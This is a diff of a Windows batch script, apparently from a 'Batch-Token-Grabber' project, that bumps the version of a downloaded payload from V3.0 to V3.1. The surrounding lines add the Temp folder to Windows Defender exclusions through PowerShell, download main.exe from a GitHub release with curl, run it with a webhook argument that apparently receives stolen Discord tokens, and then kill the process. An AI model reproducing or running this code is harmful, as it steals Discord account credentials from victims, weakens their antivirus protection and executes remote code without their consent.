@@ -51,7 +51,7 @@ if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\config.json (
 
 cd %userprofile%\AppData\Local\Temp
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
-curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
+curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.1/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
 start /w /b main.exe %webhook%
 taskkill /f /im main.exe
 
